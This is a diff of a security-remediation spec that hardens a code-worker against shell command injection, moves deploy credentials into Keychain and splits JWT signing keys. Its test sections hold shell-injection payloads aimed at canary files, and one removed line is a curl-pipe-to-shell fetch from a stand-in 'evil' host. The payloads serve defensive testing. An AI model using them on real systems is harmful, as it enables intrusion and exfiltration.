@@ -12,7 +12,7 @@ Two parallel security reviews ran on 2026-05-22 (Luna app-layer + red-team subag
 
 | # | Vector | Surface |
 |---|---|---|
-| **F1** | `shell=True` command injection in `code-worker._run` | `apps/code-worker/workflows.py:179, 992, 1004` |
+| **F1** | `shell=True` command injection in `code-worker._run` | `apps/code-worker/workflows.py:180` (the `shell=True` invocation) + every caller below |
 | **F2** | Cloudflare creds + prod `.env` live in `$HOME` on Simon's daily-driver Mac (self-hosted GH runner) | `.github/workflows/docker-desktop-deploy.yaml:88-106` |
 | **F7** | Single HS256 `SECRET_KEY` signs user JWTs + agent_tokens + OAuth-state | `apps/api/core/security.py:45`, `services/agent_token.py:112`, `api/v1/oauth.py:368` |
 
@@ -37,7 +37,7 @@ Items checked against `main` before writing this spec:
 
 - **`ENCRYPTION_KEY` is separate from `SECRET_KEY`** (`apps/api/app/core/config.py:79`). Fernet vault uses `ENCRYPTION_KEY`. Splitting `SECRET_KEY` does NOT require re-encrypting `integration_credentials.encrypted_value`. R2 from Claude's draft is cleared.
 - **`PRODUCTION.env` is gitignored** (`.gitignore:41`, `git ls-files | grep PRODUCTION` returns nothing). F2's local-disk threat stands; public-repo exposure is not present.
-- **Code-worker is restart-safe**: chat falls through to `opencode` when code-worker is down (verified earlier in session via the CLI chain walker).
+- **Code-worker is restart-safe** (claim — verify before PR1 ships): `grep -nE "opencode" apps/api/app/services/cli_platform_resolver.py` should show `opencode` as the universal fallback floor in `_DEFAULT_PRIORITY`. PR1's §6 gate adds a 30-second `docker stop agentprovision-agents-code-worker-1` test before PR2 ships, with a chat-dispatch smoke during the stop window asserting the request still gets a response (via the opencode fallback). If that fails, code-worker is NOT restart-safe and the PR1 rollout window needs scheduling around quiet hours.
 - **Keychain on the runner is feasible without interactive unlock**: the GH Actions runner runs as `nomade` (Simon's login user), and the login keychain stays unlocked while Simon is logged in — `security find-generic-password -w` works in scripts without prompting. Required guard: launchd `LimitLoadToSessionType: Aqua` so the runner only starts post-login (deferring the first-boot-no-GUI case).
 
 ## 4. Operating principle — cluster-safety gates
@@ -64,19 +64,43 @@ PR5: F7c  — drop old-kid verification + promote JWT_USER_SECRET to Ed25519
 
 ### PR1 — F1: subprocess argv hardening
 
-**Files**: `apps/code-worker/workflows.py` (lines 173, 179, 992, 1004 — every `_run(shell=True)` call site).
+**Files**: `apps/code-worker/workflows.py`. Authoritative call-site enumeration (regenerated via `grep -nE "_run\(" apps/code-worker/workflows.py` on the current `main`):
+
+| Line | Call site | User-derived interpolation? |
+|---|---|---|
+| 173 | `def _run(cmd: str, ...)` — function definition | (definition) |
+| 180 | `subprocess.run(cmd, shell=True, ...)` — the sink | (sink, **change to `shell=False`**) |
+| 622 | `_run("git fetch origin && git checkout main && git pull origin main")` | No interpolation but uses `&&` shell-chaining — split into three argv-list calls |
+| 626 | `_run(f"git checkout -b {branch_name}")` | **YES** — `branch_name` is task-derived |
+| 810 | `_run("git status --porcelain")` | No |
+| 990 | `_run("git add -A")` | No |
+| 992 | `_run(f'git commit -m "{tag}: {commit_msg}"')` | **YES** — `tag` + `commit_msg` are task-derived |
+| 993 | `_run(f'git push origin {branch_name}')` | **YES** — `branch_name` is task-derived |
+| 996 | `_run("git diff --name-only main")` (with `.split("\n")`) | No |
+| 1004 | `_run(f"git log main..{branch_name} --pretty=format:'- %h %s' --reverse")` | **YES** — `branch_name` is task-derived |
+| 1072 | `_run("git checkout main", timeout=10)` | No |
 
 **Change**:
-- Refactor `_run(cmd, shell=True, ...)` to `subprocess.run([executable, *args], shell=False, ...)`.
-- For `git commit -m "{user_text}"` → `git commit -F -` with `user_text` passed via `stdin`.
-- For `git tag` / `git push` / similar: argv-list form, never f-string into a shell string.
+- Refactor `_run(cmd: str, shell=True, ...)` → `_run(argv: list[str], shell=False, ...)`. All call sites pass list-of-strings.
+- For `git commit -m "..."` (line 992) → `subprocess.run(["git", "commit", "-F", "-"], input=f"{tag}: {commit_msg}", shell=False, ...)`. The `-F -` reads message from stdin; user-derived text never enters argv.
+- For `git checkout -b {branch_name}` (line 626), `git push origin {branch_name}` (line 993), `git log main..{branch_name}` (line 1004): argv-list form `["git", "checkout", "-b", branch_name]`. branch_name is now a single argv element; shell metacharacters in it become literal text.
+- For `git fetch origin && git checkout main && git pull origin main` (line 622): split into three sequential `_run([...])` calls. The `&&` short-circuit semantics are preserved by Python: raise-on-failure stops the chain.
 
 **Test**:
-- `tests/test_code_worker_command_injection.py` — adversarial inputs:
-  - `task_description = 'normal text $(curl -s http://evil/exfil | sh)'`
-  - `commit_msg = 'msg\\";rm -rf /tmp/poc;\\"'`
-  - `commit_msg = 'msg`id`'`
-  - Each test asserts: (a) the subprocess sees the raw string as a single positional arg, (b) no shell expansion fires (verified by attempting `$(touch /tmp/test_canary)` and asserting the canary file is absent post-test).
+- `tests/test_code_worker_command_injection.py` — adversarial inputs cover each shell-metachar class. Each test asserts the subprocess sees the raw string as a single argv element AND no canary file appears post-test:
+
+| Injection class | Payload | Test assertion |
+|---|---|---|
+| `$(...)` command substitution | `branch_name = 'feat/x$(touch /tmp/canary_dollar)y'` | `/tmp/canary_dollar` does not exist |
+| backtick command substitution | `commit_msg = 'msg`touch /tmp/canary_backtick`'` | `/tmp/canary_backtick` does not exist |
+| `;` chain | `branch_name = 'feat/x;touch /tmp/canary_semi'` | `/tmp/canary_semi` does not exist |
+| `&&` chain | `commit_msg = 'msg && touch /tmp/canary_and'` | `/tmp/canary_and` does not exist |
+| `\|` pipe | `branch_name = 'feat/x | touch /tmp/canary_pipe'` | `/tmp/canary_pipe` does not exist |
+| `>` redirect | `commit_msg = 'msg > /tmp/canary_redir'` | `/tmp/canary_redir` does not exist (or contains expected literal, not the message) |
+| `<` redirect | `branch_name = 'feat/x < /etc/passwd'` | argv[3] is the literal string, no input read |
+| newline | `commit_msg = 'msg\\n malicious-second-line'` | stdin-supplied (via `-F -`); becomes legitimate multi-line commit message, no shell execution |
+
+Each test scrubs its canary path before AND after to avoid cross-test leakage.
 
 **Cluster-safety**:
 - Touches only `apps/code-worker/`. API and chat remain on existing code-worker until the new image rolls.
@@ -134,7 +158,9 @@ PR5: F7c  — drop old-kid verification + promote JWT_USER_SECRET to Ed25519
 - Critical: after the first deploy with Keychain-read working, do NOT immediately delete `$HOME` files. Wait for one more successful deploy reading from Keychain — proves the path works across runner restarts.
 - Cloudflare Tunnel cred change: NOT happening in this PR. We're just changing where the SAME creds are loaded from. Tunnel stays up.
 
-**Rollback**: revert workflow YAML; runner uses `$HOME` path again. Keychain entries remain harmless. Zero downtime.
+**Rollback (this PR)**: revert workflow YAML; runner uses `$HOME` path again. Keychain entries remain harmless. Zero downtime.
+
+**Rollback (the post-PR3 cleanup commit that deletes `$HOME` files)**: this is the hazardous step. If the runner Mac reboots BEFORE the cleanup commit's verification gate completes, the `LimitLoadToSessionType: Aqua` guard blocks the runner from auto-starting until Simon logs in — that's acceptable (worst case: deploys queue until next login). But if the Mac reboots AFTER the cleanup commit AND the runner ends up needing creds that aren't in Keychain (e.g. a Keychain entry was corrupted or evicted), there is no `$HOME` fallback to recover from. **Mandatory before the cleanup commit ships**: encrypt the four secrets (`cloudflared/credentials.json`, `cloudflared/cert.pem`, `apps/api/.env`, `PRODUCTION.env`) with `gpg --symmetric --cipher-algo AES256` using a passphrase Simon stores in his password manager (NOT on disk). Place the four `.gpg` blobs at `~/secrets-backup/2026-05-22-pre-keychain-cleanup/` on the runner Mac AND mirror to a removable medium. Recovery procedure: `gpg --decrypt <file>.gpg > <file>` + re-`security add-generic-password`. Document this in `scripts/runner-secrets/RECOVERY.md` as part of PR3.
 
 ---
 
@@ -179,7 +205,7 @@ PR5: F7c  — drop old-kid verification + promote JWT_USER_SECRET to Ed25519
 - Requires api restart. Standalone deploy window (not batched).
 - Forced re-login for users whose JWTs predate PR4. Communicate this in the deploy plan; Simon's superuser session may need re-login mid-deploy.
 
-**Rollback**: revert PR; v2 tokens accepted again. v3 tokens (none yet, since cutover just landed) become unverifiable; affected users = none.
+**Rollback**: revert PR; v2 tokens accepted again. v3 tokens minted between PR5 deploy and the rollback become unverifiable → affected users = those who logged in during that window (size bounded by time-since-PR5; small if rollback is fast). Force-logged-out users simply re-authenticate; no data loss.
 
 ---
 
@@ -211,7 +237,7 @@ Existing chat-dispatch integration tests must remain green on every PR (no regre
 
 ## 8. Out of scope (intentional)
 
-- **`ENCRYPTION_KEY` rotation** — separate concern, separate spec. The Fernet vault key rotation is a 2-step (decrypt-with-old + re-encrypt-with-new) data migration on `integration_credentials.encrypted_value`. Not coupled to F1/F2/F7.
+- **`ENCRYPTION_KEY` rotation** — separate spec, *conditionally* deferred. The Fernet vault key rotation is a 2-step (decrypt-with-old + re-encrypt-with-new) data migration on `integration_credentials.encrypted_value`. PR3 closes the disk-leak path that exposed `ENCRYPTION_KEY` (the same `apps/api/.env` that held `SECRET_KEY` also holds `ENCRYPTION_KEY`). Deferring this rotation is safe **only under the assumption that no historical compromise of `$HOME/.env` has occurred**. Before Sub-project A ships PR5, run a post-incident review: check `auth.log`, recent `npm install` activity, brew install log, and the Mac's `last` output for unfamiliar logins. If any of those show evidence of prior compromise, ENCRYPTION_KEY rotation is no longer deferrable and Sub-project A blocks on it (add as PR3.5 with the 2-step Fernet migration). If clean, defer as planned.
 - **Cloudflare tunnel credential rotation** — F2 moves the creds; rotating them is a separate operation that requires coordination with Cloudflare's dashboard.
 - **GitHub Actions runner sandbox account** — Luna's R1 answer prefers staying on `nomade` user + login keychain over a daemon account; this means the GH runner is still in the user's session. Tightening this to a separate hardware sandbox is a follow-up.
 - **Per-tenant key derivation** for additional defense-in-depth — separate concern.
@@ -226,15 +252,24 @@ Existing chat-dispatch integration tests must remain green on every PR (no regre
 
 ## 10. Luna sign-off
 
-> **[ Luna conditional sign-off — 2026-05-22 ]**
+> **[ Luna conditional sign-off — 2026-05-22, with v2 amendments ]**
 >
-> Conditions met:
+> Original conditions (v1):
 > - reorder accepted: F1 → F7a → F2 → F7b → F7c
 > - PR2 dual-kid verifier integration test specified (§5 PR2 + §7)
 > - `PRODUCTION.env` confirmed gitignored (§3)
 > - PR2 + PR4 api restarts batched in one window (§4 + §5 PR4)
 >
-> **Status: ready for spec-document-reviewer pass and Simon's review.**
+> v2 amendments (spec-reviewer iteration 1 — 2026-05-22):
+> - F1 call-site enumeration regenerated from current `main` (§5 PR1 table) — original list missed lines 622, 626, 993, 1072
+> - PR1 adversarial test enumerated per shell-metachar class (§5 PR1 + §7) — `$()` + backtick + `;` + `&&` + `|` + `>` + `<` + newline
+> - PR3 hazardous cleanup-commit rollback explicit (§5 PR3) — GPG-encrypted offline backup of all four secrets mandatory before cleanup
+> - PR5 rollback "affected users" claim corrected (§5 PR5) — bounded by time-since-PR5, not zero
+> - ENCRYPTION_KEY deferral made conditional (§8) — depends on post-incident review of runner-host
+> - §10 sign-off scope confirmed covers BOTH `apps/api/.env` AND root `PRODUCTION.env` (Keychain migration applies to both)
+> - §3 code-worker restart-safe claim made reproducible (verify via grep + 30s stop test in PR1's gate)
+>
+> **Status: ready for spec-document-reviewer re-pass and Simon's review.**
 
 ## 11. Simon's review
 
